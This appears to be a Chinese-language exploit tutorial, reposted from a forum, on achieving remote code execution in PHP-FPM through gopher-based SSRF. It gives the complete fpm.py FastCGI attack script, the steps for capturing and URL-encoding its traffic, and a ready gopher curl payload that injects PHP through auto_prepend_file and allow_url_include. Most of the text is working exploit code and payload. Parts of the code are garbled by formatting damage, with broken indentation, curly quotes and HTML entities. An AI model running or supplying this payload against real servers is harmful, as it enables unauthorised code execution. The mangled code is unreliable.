# gopher 攻击FastCGI

> 原文：[https://www.zhihuifly.com/t/topic/3582](https://www.zhihuifly.com/t/topic/3582)

#### gopher 攻击FastCGI

利用条件

*   libcurl版本>=7.45.0(由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断)
*   PHP-FPM监听端口
*   PHP-FPM版本 >= 5.3.3
*   知道服务器上任意一个php文件的绝对路径

转换为Gopher的EXP
监听一个端口的流量 `nc -lvvp 2333 > 1.txt`，执行EXP，流量打到2333端口

```
python fpm.py -c "<?php system('echo sectest > /tmp/1.php'); exit;?>" -p 2333 127.0.0.1 php文件绝对路径 
```

> fpm.py

```
import socket
import random
import argparse
import sys
from io import BytesIO

# Referrer: [https://github.com/wuyunfeng/Python-FastCGI-Client](https://github.com/wuyunfeng/Python-FastCGI-Client)

PY2 = True if sys.version_info.major == 2 else False

def bchr(i):

if PY2:

return force_bytes(chr(i))

else:

return bytes([i])

def bord©:

if isinstance(c, int):

return c

else:

return ord©

def force_bytes(s):

if isinstance(s, bytes):

return s

else:

return s.encode(‘utf-8’, ‘strict’)

def force_text(s):

if issubclass(type(s), str):

return s

if isinstance(s, bytes):

s = str(s, ‘utf-8’, ‘strict’)

else:

s = str(s)

return s

class FastCGIClient:

“”“A Fast-CGI Client for Python”""

```
# private
__FCGI_VERSION = 1

__FCGI_ROLE_RESPONDER = 1
__FCGI_ROLE_AUTHORIZER = 2
__FCGI_ROLE_FILTER = 3

__FCGI_TYPE_BEGIN = 1
__FCGI_TYPE_ABORT = 2
__FCGI_TYPE_END = 3
__FCGI_TYPE_PARAMS = 4
__FCGI_TYPE_STDIN = 5
__FCGI_TYPE_STDOUT = 6
__FCGI_TYPE_STDERR = 7
__FCGI_TYPE_DATA = 8
__FCGI_TYPE_GETVALUES = 9
__FCGI_TYPE_GETVALUES_RESULT = 10
__FCGI_TYPE_UNKOWNTYPE = 11

__FCGI_HEADER_SIZE = 8

# request state
FCGI_STATE_SEND = 1
FCGI_STATE_ERROR = 2
FCGI_STATE_SUCCESS = 3

def __init__(self, host, port, timeout, keepalive):
    self.host = host
    self.port = port
    self.timeout = timeout
    if keepalive:
        self.keepalive = 1
    else:
        self.keepalive = 0
    self.sock = None
    self.requests = dict()

def __connect(self):
    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.sock.settimeout(self.timeout)
    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # if self.keepalive:
    #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
    # else:
    #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
    try:
        self.sock.connect((self.host, int(self.port)))
    except socket.error as msg:
        self.sock.close()
        self.sock = None
        print(repr(msg))
        return False
    return True

def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
    length = len(content)
    buf = bchr(FastCGIClient.__FCGI_VERSION) \
           + bchr(fcgi_type) \
           + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \
           + bchr(requestid &amp; 0xFF) \
           + bchr((length &gt;&gt; 8) &amp; 0xFF) \
           + bchr(length &amp; 0xFF) \
           + bchr(0) \
           + bchr(0) \
           + content
    return buf

def __encodeNameValueParams(self, name, value):
    nLen = len(name)
    vLen = len(value)
    record = b''
    if nLen &lt; 128:
        record += bchr(nLen)
    else:
        record += bchr((nLen &gt;&gt; 24) | 0x80) \
                  + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \
                  + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \
                  + bchr(nLen &amp; 0xFF)
    if vLen &lt; 128:
        record += bchr(vLen)
    else:
        record += bchr((vLen &gt;&gt; 24) | 0x80) \
                  + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \
                  + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \
                  + bchr(vLen &amp; 0xFF)
    return record + name + value

def __decodeFastCGIHeader(self, stream):
    header = dict()
    header['version'] = bord(stream[0])
    header['type'] = bord(stream[1])
    header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])
    header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])
    header['paddingLength'] = bord(stream[6])
    header['reserved'] = bord(stream[7])
    return header

def __decodeFastCGIRecord(self, buffer):
    header = buffer.read(int(self.__FCGI_HEADER_SIZE))

    if not header:
        return False
    else:
        record = self.__decodeFastCGIHeader(header)
        record['content'] = b''

        if 'contentLength' in record.keys():
            contentLength = int(record['contentLength'])
            record['content'] += buffer.read(contentLength)
        if 'paddingLength' in record.keys():
            skiped = buffer.read(int(record['paddingLength']))
        return record

def request(self, nameValuePairs={}, post=''):
    if not self.__connect():
        print('connect failure! please check your fasctcgi-server !!')
        return

    requestId = random.randint(1, (1 &lt;&lt; 16) - 1)
    self.requests[requestId] = dict()
    request = b""
    beginFCGIRecordContent = bchr(0) \
                             + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                             + bchr(self.keepalive) \
                             + bchr(0) * 5
    request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                          beginFCGIRecordContent, requestId)
    paramsRecord = b''
    if nameValuePairs:
        for (name, value) in nameValuePairs.items():
            name = force_bytes(name)
            value = force_bytes(value)
            paramsRecord += self.__encodeNameValueParams(name, value)

    if paramsRecord:
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
    request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

    if post:
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
    request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

    self.sock.send(request)
    self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
    self.requests[requestId]['response'] = b''
    return self.__waitForResponse(requestId)

def __waitForResponse(self, requestId):
    data = b''
    while True:
        buf = self.sock.recv(512)
        if not len(buf):
            break
        data += buf

    data = BytesIO(data)
    while True:
        response = self.__decodeFastCGIRecord(data)
        if not response:
            break
        if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
            if requestId == int(response['requestId']):
                self.requests[requestId]['response'] += response['content']
        if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
            self.requests[requestId]
    return self.requests[requestId]['response']

def __repr__(self):
    return "fastcgi connect host:{} port:{}".format(self.host, self.port) 
```

if **name** == ‘**main**’:

parser = argparse.ArgumentParser(description=‘Php-fpm code execution vulnerability client.’)

parser.add_argument(‘host’, help=‘Target host, such as 127.0.0.1’)

parser.add_argument(‘file’, help=‘A php file absolute path, such as /usr/local/lib/php/System.php’)

parser.add_argument(’-c’, ‘–code’, help=‘What php code your want to execute’, default=’<?php phpinfo(); exit; ?>’)

parser.add_argument(’-p’, ‘–port’, help=‘FastCGI port’, default=9000, type=int)

```
args = parser.parse_args()

client = FastCGIClient(args.host, args.port, 3, 0)
params = dict()
documentRoot = "/"
uri = args.file
content = args.code
params = {
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'POST',
    'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
    'SCRIPT_NAME': uri,
    'QUERY_STRING': '',
    'REQUEST_URI': uri,
    'DOCUMENT_ROOT': documentRoot,
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '9985',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1',
    'CONTENT_TYPE': 'application/text',
    'CONTENT_LENGTH': "%d" % len(content),
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
response = client.request(params, content)
print(force_text(response)) 
``` 
```

url编码

```
f = open('1.txt')
ff = f.read()
from urllib import quote
print quote(ff) 
```

得到gopher的exp

```
curl 'gopher://127.0.0.1:9000/_%01%01%97%9C%00%08%00%00%00%01%00%00%00%00%00%00%01%04%97%9C%01%D5%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%15SCRIPT_FILENAME/var/www/html/123.php%0B%15SCRIPT_NAME/var/www/html/123.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%15REQUEST_URI/var/www/html/123.php%01%04%97%9C%00%00%00%00%01%05%97%9C%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%97%9C%00%00%00%00' 
```